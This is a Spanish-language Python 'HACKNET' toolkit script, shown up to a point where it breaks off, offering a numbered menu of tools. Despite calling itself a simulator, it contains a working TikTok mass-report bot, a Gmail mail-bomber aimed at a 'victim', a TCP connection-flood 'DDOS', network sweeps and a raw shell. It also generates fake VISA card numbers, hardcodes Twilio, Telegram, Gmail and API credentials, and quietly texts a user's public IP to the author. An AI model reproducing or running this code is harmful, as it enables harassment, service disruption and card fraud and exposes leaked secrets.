import os
ins = input("instalar programa?[y/n]: ")
if ins == "y":
	os.system('pip install requests')
	os.system('pip install python-nmap')
	os.system('pip install openai')
	os.system('pip install bs4')
	os.system('pip install telebot')
	os.system("pip install ping3")
	os.system("pip install openai")
	#os.system("pip install sqlite3")
	os.system('pip install randomtimestamp')
	os.system("pkg install nmap")
	
	try:
	    print("")
	except:
	    os.system("apt install nmap")
	os.system('clear')
elif ins == "n":
	os.system("clear")
pr1 = input("quieres usar la version completa?[y/n]")
if pr1 == "y":
	os.system("pip install twilio")
	os.system("pip install openai")
	from twilio.rest import Client
	import openai
elif pr1 == "n":
	print("")
import requests
#from twilio.rest import Client
from ping3 import ping, verbose_ping
import ping3
import random
from time import sleep
from os import name, system
import json
import threading
import sqlite3
from sqlite3 import Error
from bs4 import BeautifulSoup
import urllib.request as request
import ssl
from urllib import request
from binascii import hexlify
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
from email.mime.text import MIMEText
import socket
import telebot  
#import openai
import logging
import asyncio
import sys
import nmap
from time import sleep
from http.server import BaseHTTPRequestHandler
import time
import os
import re
import platform
from datetime import datetime
import binascii
import ipaddress
import platform
wq = random.randrange(1,16)
if wq == 1:
    wq="197.158.100.9"
elif wq == 2:
    wq="196.168.100.195"   
elif wq == 3:
    wq="198.178.160.80"
elif wq == 4:
    wq="196.126.100.70"
elif wq == 5:
    wq="193.156.120.35"
elif wq == 6:
    wq="192.100.179.10" 
elif wq == 7:
    wq="198.167.168.80"
elif wq == 8:
    wq="195.132.100.70" 
elif wq == 9:
    wq="194.120.100.40"
elif wq == 10:
    wq="196.120.150.10"  
elif wq == 11:
    wq="194.102.130.18"
elif wq == 12:
    wq="196.120.178.15"
elif wq == 13:
    wq="196.129.168.17"
elif wq == 14:
    wq="195.120.100.16" 
elif wq == 15:
    wq="198.167.178.30"
elif wq == 16:
    wq="194.132.100.70"   

m = random.randrange(1,4)    
if m == 1:
    m = 10
if m == 2:
    m = 8
if m == 3:
    m = 12
if m == 4:
    m = 7 
def p():
    i = random.randrange(1,8)
    if i == 1:
        print("*****801")
    if i == 2:    
        print("******31")
    if i == 3:
        print("*****bc")   
    if i == 4:
        print("*****8J0")  
    if i == 5:
        print("*****81")
    if i == 6:    
        print("******1")
    if i == 7:
        print("*****89")
    if i == 8:
        print("*****123" )
def l():  
    o = random.randrange(1,4) 
    if o == 1:
        print("+********102")      
    if o == 2:
        print("+********710")
    if o == 3:
        print("+********537")   
    if o == 4:
        print("+********589")
    if o == 5:
        print("+********812")   
    if o == 6:
        print("+********591")  
    if o == 7:
        print("+********330")    
    if o == 8:
        print("+********430")    
    if o == 9:
        print("+********540")  
    if o == 10:
        print("+********503")
def q():  
    o = random.randrange(1,4) 
    if o == 1:
        print("***102")      
    if o == 2:
        print("****10")
    if o == 3:
        print("***457")   
    if o == 4:
        print("***419")
    if o == 5:
        print("***781")   
    if o == 6:
        print("***301")  
    if o == 7:
        print("***910")    
    if o == 8:
        print("***341")    
    if o == 9:
        print("***671")  
print("[!]HACKNET es solo un simulador de hacking")
sleep(1)
os.system("clear")
sleep(2)                    
x = "\033[31;m"
#e = "\033[32;m"
h ="\033[34;m"
u = "\033[36;m"
r = "\033[33;m"
RR = "\033[29;m"
SS = "\033[32;m"
def a(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(1./170)
00
def e(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(1./170)
00	
def f(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(1./170)
00		
def auten():
	b = False
	a = input("contraseña: ")
	if a == "admin":
		b = True
	if a == "axelxs30":
		b = True
	if a == "axelxs#30":
		b = True
		def sms():
			def obtener_ip_publica():
			    try:
			        response = requests.get('https://httpbin.org/ip')
			        data = response.json()
			        ip_publica = data['origin']
			        return ip_publica
			    except requests.exceptions.RequestException:
			        return None
			
			ip = obtener_ip_publica()
			account_sid = 'AC13830312f9b7c4a87a450fe8c826dfc7'
			auth_token = 'c53fa06ed5b557a81ba5be35e6401f92'
			client = Client(account_sid, auth_token)
			num = "+527228485261"
			text = f"{ip} abrio el script"
			message = client.messages.create(
			  from_='+17165574281',
			  body=f"{text}",
			  to=f"{num}"
			)
		sms()
	if b == True:
		print("contraseña correcta")

		
	if b == False:
		while True:
			print('contraseña incorrecta [CTR+C] para salir')
			os.system("clear")
auten()		
a(RR+"█▀▄▀█ █░░█ █▀▀▀█ █▀▀▀ ▀▀█▀▀ █░▒█ █▀▀█")
a(RR+"█▒█▒█ █▄▄█ ▀▀▀▄▄ █▀▀▀ ░▒█░░ █░▒█ █▄▄█")
a(RR+"█░░▒█ ▄▄▄█ █▄▄▄█ █▄▄▄ ░▒█░░ ▀▄▄▀ █░░░")
a(RR+"╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱   ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱")

a(RR+" Creador: Axel")      
a(RR+" Tiktok: yo.axelxs") 
a(RR+" instagram: soy.axelxs")
a(RR+" YouTube: a..x..e..l..x..s")
print("")
a(RR+"╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱   ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱")
choice = int(input("1.-TIKTOK REPORT BOT\n2.-ESCANEO WEP\n3.-spam de correos gmail\n4.-info de IP publica\n5.-Servidor privado http\n6.-Mi IP privada \n7.-info basica de cualquier tipo de ip \n8.-Info de un numero\n9.-Barrido de IP\n10.-BotChat\n11.-TelegramBot\n12.-DDOS\n13.-codigo fuente de una wep\n14.-SSL wep\n15.-Usar bash\n16.-hacknet tiktok\n17.-hacknet ig\n18.-hacknet facebook\n19.-hacknet telegram\n20.-hacknet whatsapp\n21.-CCV VISA\n22.-intruso router\n23.-CARDS v2\n24.-ping\n25.-geolocalizacion de ip\n26.-openai\n27.-relaciones web\n28.-ddos v2\n29.-imspector de archivos\n30.-SQLite\n31.-Mi IP publica\n32.-Bineokit\n33.-osint\nSeleccione una opsion: ")) 

b = 1         
if choice == 1:
  cv = int(input("1.-simulador de report\n2.-Real\nSelecciona una opsion: "))
  if cv == 1:
      op = int(input("1.-atake consentrado\n2.-atake bruto\nSeleccione una opsion:"))  
      if op == 1:
       os.system("clear")
       a(RR+"  █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀█ ▀▀█▀▀ ░░ █▀▀█ █▀▀▀█ ▀▀█▀▀")
       a(RR+"  █▄▄▀ █▀▀▀ █▄▄█ █░░▒█ █▄▄▀ ░▒█░░ ▀▀ █▀▀▄ █░░▒█ ░▒█░░")
       a(RR+"  █░▒█ █▄▄▄ █░░░ █▄▄▄█ █░▒█ ░▒█░░ ░░ █▄▄█ █▄▄▄█ ░▒█░░")
       print("\033[;32m")
       username = ""
       username = input("usuario:")
       while True:
             print (("[*]"),"REPORT-BOT FOR TIKTOK USER @", (username), (b))
             sleep(1)
             b = b + 1
      elif op == 2:
       os.system("clear")
       a(RR+"  █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀█ ▀▀█▀▀ ░░ █▀▀█ █▀▀▀█ ▀▀█▀▀")
       a(RR+"  █▄▄▀ █▀▀▀ █▄▄█ █░░▒█ █▄▄▀ ░▒█░░ ▀▀ █▀▀▄ █░░▒█ ░▒█░░")
       a(RR+"  █░▒█ █▄▄▄ █░░░ █▄▄▄█ █░▒█ ░▒█░░ ░░ █▄▄█ █▄▄▄█ ░▒█░░")
       print("\033[;32m")
       username = ""
       username = input("usuario:")
       while True:
             print (("[*]"),"REPORT-BOT FOR TIKTOK USER @", (username), (b))
             b = b + 1  

  elif cv == 2:

        col = "\033[32;m"
        
        try:
          import requests
        except ImportError:
            os.system('python -m pip install requests')
        try:
          import urllib3
        except ImportError:
            os.system('python -m pip install urllib3')
        try:
          from bs4 import BeautifulSoup
        except ImportError:
            os.system('python -m pip install bs4')
        
        def clear():
            if name == 'nt':
                _ = system('cls')
            else:
                _ = system('clear')
        
        clear()
        a(RR+"  █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀█ ▀▀█▀▀ ░░ █▀▀█ █▀▀▀█ ▀▀█▀▀")
        a(RR+"  █▄▄▀ █▀▀▀ █▄▄█ █░░▒█ █▄▄▀ ░▒█░░ ▀▀ █▀▀▄ █░░▒█ ░▒█░░")
        a(RR+"  █░▒█ █▄▄▄ █░░░ █▄▄▄█ █░▒█ ░▒█░░ ░░ █▄▄█ █▄▄▄█ ░▒█░░")
        
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        srttm = time.time()
        
        usr = input("[?] Username: ")
        
        if usr.startswith("@"):
            usr = usr
        else:
            usr = f"@{usr}"
        
        r0 = requests.get(f"https://www.tiktok.com/{usr}", headers={"User-Agent":"Mozilla/5.0 (Linux; Android 11; M2102J20SG Build/RQ3A.210705.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 trill_2022002050 JsSdk/1.0 NetType/WIFI Channel/googleplay AppName/musical_ly app_version/20.2.5 ByteLocale/en ByteFullLocale/en Region/US"})
        soup = BeautifulSoup(r0.text, "html.parser")
        content = soup.find_all(attrs={"id":"__NEXT_DATA__"})
        content = json.loads(content[0].contents[0])
        profile_data = {
            "uid":content['props']['pageProps']['userInfo']['user']['id']
            }
        
        uid = f"{profile_data.get('uid')}"
        
        print("\n", end="")
        
        def report():
            h1 = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US",
                "content-type": "application/json",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
                }
        
            d1 = """{
                "reason": "311",
                "object_id": "%s",
                "owner_id": "%s",
                "report_type": "user"
                }""" % (uid, uid)
        
            r1 = requests.post("https://www.tiktok.com/node/report/reasons_put?", headers=h1, data=d1, verify=False, timeout=999999)
        
            if r1.ok:
                r1json = r1.json()
                #if r1json.get("statusCode") == True:
                      #  try:
                          #  print(f"[+] Report sent successfully")
                    #    except:
                      #       print(f"[-] Report could not be sent")
                         #    return
                        
            try:
                 print(col, v, "[+] Report send successfull") 
            except:
                  print(col, v, "[-] Reporr could not be sent")   
        
        v = 0
        print("User ID: ", uid)
        print("Username: ", usr)    
                
        while True:
            v = v+1
            report()
            time.sleep(2.0 - ((time.time() - srttm) % 2.0))
       
       
     
                
                  
                  
                  
elif choice == 2:
    a = ""
    a = input("ingresa el dominio wep:")
    TARGETS = [
    ((a), 'https')
    ]
    
    
    async def main(loop, targets):
            for target in targets:
                info = await loop.getaddrinfo(
                *target,
                proto=socket.IPPROTO_TCP,
            ) 
             
            for host in info:
                print('{:20}: {}'.format(target[0], host[4][0]))
        
    event_loop = asyncio.get_event_loop()
    try:
            event_loop.run_until_complete(main(event_loop, TARGETS))
    finally:
            event_loop.close()
    try:
            print("escaneo exitoso")
    except:
                print("ERROR")
    def myping(host):
      response = os.system("ping -c 1 " + host)
    
      if response == 0:
        return True
      else:
        return False
        
    print(myping(a))
    def formato_direccion_ip():
    		
    		 equipo_remoto_a = socket.gethostbyname(a)
    
    		 for dir_ip in [equipo_remoto_a]:
    					 empaquetada_ip = socket.inet_aton(dir_ip)
    					 no_empaquetada_ip = socket.inet_ntoa(empaquetada_ip)
    					 print ("Direccion Ip: %s => Empaquetada: %s, No Empaquetada: %s" %(dir_ip, hexlify(empaquetada_ip), no_empaquetada_ip))
    
    if __name__ == '__main__':
    		 formato_direccion_ip()
    a = f"nmap -vv {a}"
    os.system(a)
    quit()
                  
elif choice == 3:
   os.system("clear")
   a (RR+"█▀▀ █▀▀ █▀▀▄ █▀▀▄ █▀▄▀█ █▀▀█ ░▀░ █░░")
   a(RR+"▀▀█ █▀▀ █░░█ █░░█ █░▀░█ █▄▄█ ▀█▀ █░░")
   a(RR+"▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀░ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀")
   
   from email.mime.multipart import MIMEMultipart
   from email.mime.text import MIMEText
   import smtplib
   msg = MIMEMultipart()
   a = ""
   a = input("gmail de la victima:")
   b = input("asunto:")
   c = input ("contenido:")
   d = float(input("numero se mensajes que quieres enviar:"))
   message = (c)
   e = 0
   while e < d:
    password = "xmcd xuvb gimd ptoi"
    msg['From'] = "axelxsx07@gmail.com"
    msg['To'] = (a)
    msg['Subject'] = (b)
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    e = e+1
   
   server.quit()
   try:
       print ("correo(s) enviado a %s con exito" % (msg['To']))
       
   except:
    print("[#]ERROR")
    
                      
                      
elif choice == 4:
  
  api_url = "http://ip-api.com/json/"
  parametros = 'status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
  data = {"fields":parametros}
  def ip_scraping(ip=""):
      res = requests.get(api_url+ip, data=data)
      api_json_res = json.loads(res.content)
      return api_json_res
  if __name__ == '__main__':
          ip = input("𝙄𝙉𝙂𝙍𝙀𝙎𝘼 𝙇𝘼 𝙄𝙋: ")
          par = parametros.split(",")
          for x in par:
              print(x.upper(), ":")
              print(ip_scraping(ip)[x])
              print("n")
              
    
    
              
              
elif choice == 5:
     print("\033[;32m")
     class GetHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header(
            'Content-Type',
            'text/plain; charset=utf-8',
            )
            self.send_header(
            'Last-Modified',
            self.date_time_string(time.time())
            )
    

            self.end_headers()
            self.wfile.write((text).encode('utf-8'))
     IP = ""
     IP = input("host: ")
     PORT = int(input("port: "))
     text = ""
     text = input ("ingresa el contenido del server:")
     if __name__ == '__main__':
         from http.server import HTTPServer
         server = HTTPServer(( (IP), PORT,), GetHandler)
     try:
        print("coneccion exitosa :)")
        sleep(1)
        print("te doy la bienvenida a mi server")
        sleep(1)
        print("la coneccion esta avierta...")
        server.serve_forever()
     except:
        print("ERROR :(")
        
        
elif choice == 6:
        def extract_ip():
            st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                st.connect(('10.255.255.255', 1))
                IP = st.getsockname()[0]
            except Exception:
                IP = '127.0.0.1'
            finally:
                st.close()
            return IP
        print(extract_ip())



elif choice == 7:
     IP = ""
     IP = input("PONGA LA IP:")
     ADDRESSES = [IP]
     for ip in ADDRESSES:
         addr = ipaddress.ip_address(ip)
         print('{!r}'.format(addr))
         print('   IP version:', addr.version)
         print('   is private:', addr.is_private)
         print('  packed form:', binascii.hexlify(addr.packed))
         print('      integer:', int(addr))
         print()
     
     
elif choice == 8:

    os.system("clear")
   
    api_key = '31e04799e5b72d22be4bed51565ddadb'
    number = int(input("Numero de telefono: "))
    data = requests.get("http://apilayer.net/api/validate?access_key=%s&number=%s&country_code&format=1" % (api_key, number))
    for key, value in data.json().items():
        print("%s: %s" % (key, value))
   
 
elif choice == 9:
    
    
    g = int(input("1.-barrido grande\n2.-barrido a solo puertos basicos (21, 22, 25, 80)\nEnter Choice : ")) 
    
    
    if g == 1:
        
        print("\033[32;1m")
        
        ip = input("Ingresa la IP: ")
        ipDividida = ip.split('.')
        try:
            red = ipDividida[0]+'.'+ipDividida[1]+'.'+ipDividida[2]+'.'
            comienzo = int(input("Ingresa el número de comienzo de la subred: "))
            fin = int(input("Ingresa el número en el que deseas acabar el barrido: "))
            print ("[#] el barrido puede tardar segun la ip")
        except:
            print("[!] Error")
            sys.exit(1)
            
            
        if (platform.system()=="Windows"):
            ping = "ping -n 1"
        else :
            ping = "ping -c 1"
            tiempoInicio = datetime.now()
            print("[*] El escaneo se está realizando desde",red+str(comienzo),"hasta",red+str(fin))
            for subred in range(comienzo, fin+1):
                direccion = red+str(subred)
                response = os.popen(ping+" "+direccion)
                for line in response.readlines():
                    if ("ttl" in line.lower()):
                        print(direccion,"está activo")
                        break
        tiempoFinal = datetime.now()
        tiempo = tiempoFinal - tiempoInicio
        print("[*] El escaneo ha durado %s"%tiempo)()
        
  
        quit()
      
    
    elif g == 2:
        
            print (" puede que este programa no funcione, si no funciona elija el barrido grande")
            IP = ""
            IP = input ("IP del escaneo :")
            def scan(addr, port):
                socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = socket_obj.connect_ex((addr,port)) 
                socket_obj.close()
                return result
            ports=[21, 22, 25, 80]
            for i in range(1,255):
                addr=(IP).format(i)
                for port in ports:
                    result=scan(addr, port)
                    if result==0:
                        print(addr, port, "OK")
                    else:
                        print(addr, port, "Failed")    
                       
                         
elif choice == 10:
       ahutor = "axelxs"
       print("autor:", ahutor)
       print("BotChat")
       print ("escribe cualquier cosa")
       c = "\033[32;m"
       b = 1
       while True:
           a = input("")
           print (("——"), (c), (b), (a))
           b = b+1    
                        
                       
elif choice == 11:
	
	# Reemplaza 'YOUR_TELEGRAM_BOT_TOKEN' con el token de tu bot
	a(RR+" ▀▀█▀▀ █▀▀▀ █░░░ █▀▀▀ █▀▀█ █▀▀▀█ ▀▀█▀▀")
	a(RR+" ░▒█░░ █▀▀▀ █░░░ █▀▀▀ █▀▀▄ █░░▒█ ░▒█░░")
	a(RR+" ░▒█░░ █▄▄▄ █▄▄█ █▄▄▄ █▄▄█ █▄▄▄█ ░▒█░░")
	opsionbot = int(input("1.-axelxsx07bot\n2.-Pastryboybot\nSeleccione el bot que desee usar: "))
	aut = False
	if opsionbot == 1:
		TOKEN = '7042671143:AAGlAg4E4jvMltZC4BdOknnwALSIW1K6WJs'
		aut = True
	
	if opsionbot == 2:
		TOKEN = '5203289182:AAEa7KpNV4Fsn2NgUkJWXrpLD1YOlEYk_kc'
		aut = True
	
	if aut == False:
		print("respuesta invalida")
	
	bot = telebot.TeleBot(TOKEN)
	openv = int(input("1.-Bot repetidor\n2.-Bot para mandar\nSeleccione una opsion: "))
		
	@bot.message_handler(commands=['start'])
	def send_welcome(message):
	    bot.reply_to(message, "¡Hola! Soy un bot de Telegram creado por axel. ¿Cómo puedo ayudarte hoy?")
	@bot.message_handler(commands=['github'])
	def send_welcome(message):
	    bot.reply_to(message, "https://github.com/axelxsx07/setup")
	# Maneja el comando /help
	@bot.message_handler(commands=['help'])
	def send_help(message):
	    bot.reply_to(message, "Estos son los comandos disponibles:\n/start - Iniciar la conversación\n/help - Mostrar esta ayuda")
	if openv == 2: 
		@bot.message_handler(func=lambda message: True)
		def handle_message(message):
		    response = input(f"Usuario {message.from_user.username} dijo: {message.text}\nTu respuesta: ")
		    bot.reply_to(message, response) 
	    
	# Maneja mensajes de texto que no son comandos
	elif openv == 1:
		@bot.message_handler(func=lambda message: True)
		def echo_all(message):
		    bot.reply_to(message, message.text)
		
	# Inicia el bot
	bot.polling()
    				
    		        		    
   
elif choice == 12:
    os.system("clear")
    RR = "\033[29;m"
    def a(s):
            for c in s + '\n':
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    time.sleep(1./170)
                    
       
    a(RR+"█▀▀▄ █▀▀▄ █▀▀█ █▀▀▀█")
    a(RR+"█░▒█ █░▒█ █░░█ ▀▀▀▄▄")
    a(RR+"█▄▄▀ █▄▄▀ ▀▀▀▀ █▄▄▄█ ")        
    time.sleep(2) 
    
    print("\033[32;m")
    ip = input("hostname o IP>>>")
    port = input("Port>>>>")
    while True:
        
    
        
        size = ("30000")
        ip = str(ip)
        port = int(port)
        pac = int("65536")
        print("\033[32;m")
        print('[*] Launching Attack ...')
        
        addr = ((ip,port))
        socks = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            socks.connect_ex(addr)
            connected = 1
        except socket.error:
            connected = 0
            print('Hostname could not be resolved')
        i = 0
        
        #data = hashlib.sha512(size).hexdigest()
        errors = 0
        a = 0
        while i < pac:
            i+=1
            try:
                socks.settimeout(0.03)
                socks.connect_ex(addr)
                #socks.send(data)
                print("|",(a), "| [*] successfully | ", (port))
                a = a+1
            except socket.error:
                print('[#]Conection Error')
                errors = errors + 1  
    
   
elif choice == 13:
   
    
    url = input("url de la pagina wep: ")
    response = request.urlopen(url)
    print('RESPONSE:', response)
    print('URL     :', response.geturl())
    
    headers = response.info()
    print('DATE    :', headers['date'])
    print('HEADERS :')
    print('---------')
    print(headers)
    
    data = response.read().decode('utf-8')
    print('LENGTH  :', len(data))
    print('DATA    :')
    print('---------')
    print(data)  
    
                      
                                         
elif choice == 14:
 
    print("este script manda mensajes encriotados a paginas wep")
    t = input("Texto: ")
    xd = input("pagina wep: ")
        
    if (not os.environ.get((t), '') and
    getattr(ssl, '_create_unverified_context', None)): 
    
       ssl._create_default_https_context = ssl._create_unverified_context
       class InternetOk():
            def Internet(self):
                siInternet = False
                while not siInternet:    
                    try :
                        web = (xd)
                        data = request.urlopen(web)
                        siInternet = True
                        break
                    except:
                        siInternet = False
                return  siInternet
    inter = InternetOk()
    print (inter.Internet())                                                           
    
elif choice == 15:
    print("Bash > python3.9 > Linux ")
    while True:
	    a = input(">>>")
	    os.system(a)    
	

elif choice  == 16:

    c = input("Username: ")
    c = f"@{c}"   
    d = f"Buscando claves de {c} ..."
    e(SS+d)
    sleep(2)
    e(SS+"Buscando IP's...")
    sleep(1)
    j = 32895
    for g in range (1,m):
            print(h+"127.0.0.1:", j)
            j=j+7412
            sleep(1)
    wq = f"{wq}"    
    g = f"{g}"   
    f(u+ str(wq))
    sleep(1)
    print(wq, "SUCCESSFUL")
    e(SS+f"Buscando servidores a activos de {wq}")
    print(r+"")
    g = 9873
    for sa in range(1,m):
        sleep(1)
        print(r, wq,"::",g)
        g=g+4172 
    g=g+1291     
    e(u+f"{wq} :: {g}")  
    e(u+"SUCCESSFUL")     
    e(SS+'CRACKING FOR PASSWORD...')
    print(r+"")
    for y in range(1,m):
        sleep(1)
        p()
    e(u+"password successful, packing in password.txt")
    e(SS+"information for database...")
    e(SS+"MySQL and SQLMAP successful")
    e(u+"databases successful, packing in databases.txt")   
    e(u+'successful')
elif choice == 17:

    c = input("Username: ")
    c = f"@{c}"   
    d = f"Buscando claves de {c} ..."
    e(SS+d)
    sleep(2)
    e(SS+"Buscando IP's...")
    sleep(1)
    e(SS+"Entrando a la base de datos")
    j = 15895
    for g in range (1,m):
            print(h+"127.0.0.1:", j)
            j=j+8567
            sleep(1)
    f(u+ str(wq))
    sleep(1)
    print(u, "SUCCESSFUL")
    e(SS+f"Buscando servidores a activos de {wq}...")
    print(r+"")
    g = 9873
    for sa in range(1,m):
        sleep(1)
        print(r+wq,"::",g)
        g=g+4172 
    g=g+1291     
    e(u+f"{wq}::{g}")  
    e(u+"SUCCESSFUL")     
    e(SS+'CRACKING FOR PASSWORD...')
    print(r+"")
    for y in range(1,m):
        sleep(1)
        p()
        
    e(u+"password successful, packing in password.txt(2)")
    e(SS+"information for database...")
    e(SS+"information successful")
    e(u+"databases successful, packing in databases.txt(2)")   
    e(u+'successful')    
    
elif choice == 18:

    c = input("Username: ")
    c = f"@{c}"   
    d = f"Buscando claves de {c} ..."
    e(SS+d)
    sleep(2)
    e(SS+"Entrando a 'META'...")
    sleep(1)
    e(SS+"Buscando IP's...")
    sleep(1)
    e(SS+"Entrando a la base de datos de 'META' ")
    sleep(1)
    j = 18102
    for yu in range (1,m):
            print(h+"127.0.0.1::", j)
            j=j+7120
            sleep(1)
    f(u+ str(wq))
    sleep(1)
    e(SS+f"Buscando servidores a activos de {wq}...")
    print(r+"")
    g = 9873
    for sa in range(1,m):
        sleep(1)
        print(r+wq,"::",g)
        g=g+4172 
    g=g+1291     
    e(u+f"{wq}::{g}")  
    e(u+"SUCCESSFUL")     
    print(u, "SUCCESSFUL")
    e(SS+'CRACKING FOR PASSWORD...')
    print(r+"")
    for y in range(1,m):
        sleep(1)
        p()
        
    e(u+"password successful, packing in password.txt(3)")
    e(SS+"information for database...")
    e(SS+"information successful")
    e(u+"databases successful, packing in databases.txt(3)")   
    e(u+'successful') 
elif choice == 19:

    c = input("Username: ")
    c = f"@{c}"   
    d = f"Buscando claves de {c} ..."
    e(SS+d)
    sleep(2)
    e(SS+"Buscando IP's...")
    sleep(1)
    e(SS+"Entrando a la base de datos")
    j = 29170
    for g in range (1,m):
            print(h+"127.0.0.1:", j)
            j=j+5401
            sleep(1)
    f(u+ str(wq))
    sleep(1)
    print(u, "SUCCESSFUL")
    e(SS+'CRACKING FOR FILES')
    e(u+"files successful, packing in files.txt(4)")
    e(SS+"Check for numer")
    sleep(1)
    print(r+"")
    for y in range(1,m):
        sleep(1)
        l()    
    e(u+"numer successful, packing in  numer.txt(4)")
    sleep(1)
    e(SS+"Creando copia de segiridad...")
    e(SS+"EXPORTANDO COPIA...")
    e(u+"successful")
    e(SS+f"Buscando servidores a activos de {wq}...")
    print(r+"")
    g = 9873
    for sa in range(1,m):
        sleep(1)
        print(r+wq,"::",g)
        g=g+4172 
    g=g+1291     
    e(u+f"{wq}::{g}")  
    e(u+"SUCCESSFUL") 
    e(SS+"information for database...")
    e(SS+"information successful")
    e(u+"databases successful, packing in databases.txt(4)")   
    e(u+'successful')  
        
elif choice == 20:

    c = input("numero: ")
    c = f"@{c}"   
    d = f"Buscando claves de {c} ..."
    e(SS+d)
    sleep(2)
    e(SS+"Buscando IP's...")
    sleep(1)
    e(SS+"Entrando a la base de datos")
    j = 29170
    for g in range (1,m):
            print(h+"127.0.0.1:", j)
            j=j+5401
            sleep(1)
    f(u+ str(wq))
    sleep(1)
    print(u, "SUCCESSFUL")
    e(SS+'CRACKING FOR FILES')
    e(u+"files successful, packing in files.txt(4)")
    e(SS+"Check for code verify")
    sleep(1)
    print(r+"")
    for y in range(1,m):
        sleep(1)
        q()    
    e(u+"code successful, packing in  code.txt(4)")
    sleep(1)
    e(SS+"Creando copia de segiridad...")
    e(SS+"EXPORTANDO COPIA...")
    e(u+"successful")
    e(SS+f"Buscando servidores a activos de {wq}...")
    print(r+"")
    g = 9873
    for sa in range(1,m):
        sleep(1)
        print(r+wq,"::",g)
        g=g+4172 
    g=g+1291     
    e(u+f"{wq}::{g}")  
    e(u+"SUCCESSFUL") 
    e(SS+"information for database...")
    e(SS+"information successful")
    e(u+"databases successful, packing in databases.txt(4)")   
    e(u+'successful')         

elif choice == 21:
    def mn(s):
            for c in s + '\n':
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    time.sleep(6./50)    
    mn(RR+"SOLO LOS ADMIN PUDEN USAR ESTE SCRIPT")

    00
    #usua son playing with mom'
    axelxs = 1
    b =input("usuario: ")
    if b == "axelxs":
        c = input("contraseña: ")  
        if c == "axelxs#30":
            mn(RR+"usuario registrado con exito...")
            vy= float(input("tiempo de retardo: "))
            gh = 0
            while True:
                i = random.randrange(1,20)
                if i == 1:
                        d =("20101027")
                if i == 2:    
                        d =("61829101")
                if i == 3:
                        d = ("67152801") 
                if i == 4:
                        d = ("81910183")  
                if i == 5:
                        d = ("61389191")
                if i == 6:    
                        d = ("08281998")
                if i == 7:
                        d = ("92837271")
                if i == 8:
                        d = ("62810271")
                if i == 9:
                        d = ("74788668")
                if i == 10:
                        d = ("47619179")
                if i == 12:    
                        d = ("61639101")
                if i == 13:
                        d = ("46130173") 
                if i == 14:
                        d = ("51291736")  
                if i == 15:
                        d = ("37883178")
                if i == 16:    
                        d = ("81377317")
                if i == 17:
                        d = ("88371938")
                if i == 18:
                        d = ("17371838")
                if i == 19:
                        d = ("64784819")     
                if i == 20:
                        d = ("61820153")                                    
                x = random.randrange(1,6)    
                if x == 1:
                        c ="4480"
                if x == 2:
                       c="4850" 
                if x == 3:        
                    c="4822"      
                if x == 4:        
                    c="4811"       
                if x == 5:
                    c="4945" 
                n = random.randrange(1,3)    
                if n == 1:
                    v = "5256"
                if n == 2:
                        v = "4589"
                if n == 3:
                        v = "5289"
                if n == 4:
                       v = "0275"
                if n == 5:
                        v = "4509"
                if n == 6:
                        v = "4201"                
                s = random.randrange(1,12)    
                if s == 1:
                    k = "443"
                if s == 2:
                        k = "423"
                if s == 3:
                        k = "891"
                if s == 4:
                       k = "251"
                if s == 5:
                        k = "091"
                if s == 6:
                        k = "251"        
                if s == 8:
                    k = "256"
                if s == 8:
                        k = "459"
                if s == 9:
                        k  = "529"
                if s == 10:
                       k = "451"
                if s == 11:
                        k = "651"
                if s == 12:
                        k = "781"     
                e = random.randrange(1,12)    
                if e == 1:
                    qk = "06/25"
                if e == 2:
                        qk = "09/28"
                if e == 3:
                        qk = "07/24"
                if e == 4:
                       qk = "02/28"
                if e == 5:
                        qk = "05/26"
                if e == 6:
                        qk = "04/26"        
                if e == 8:
                    qk = "02/26"
                if e == 8:
                        qk = "04/29"
                if e == 9:
                        qk  = "03/26"
                if e == 10:
                       qk = "09/24"
                if e == 11:
                        qk = "07/26"
                if e == 12:
                        qk = "10/29"            
                gg = f"cvc:{k}"     
                op = f"MM/AA:{qk}"  
                xc =f"VISA:{c}{d}{v}"    
                time.sleep(vy)
                print(xc, gg, op)        
                                                
elif choice == 22:                                                                                                       


	IP = input("IP del host>>>")
	port = 8000
	print("el puerto designado es 8000")
	print("recuerda redireccionar la IP predetermimada del router y redireccionar a ", IP,"::",port)	
	host = socket.gethostname() 
	BUFFER_SIZE = 1024 
	while True:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_tcp:
		    socket_tcp.bind((IP, port)) 
		    socket_tcp.listen(5) 
		    conn, addr = socket_tcp.accept() 
		    with conn:
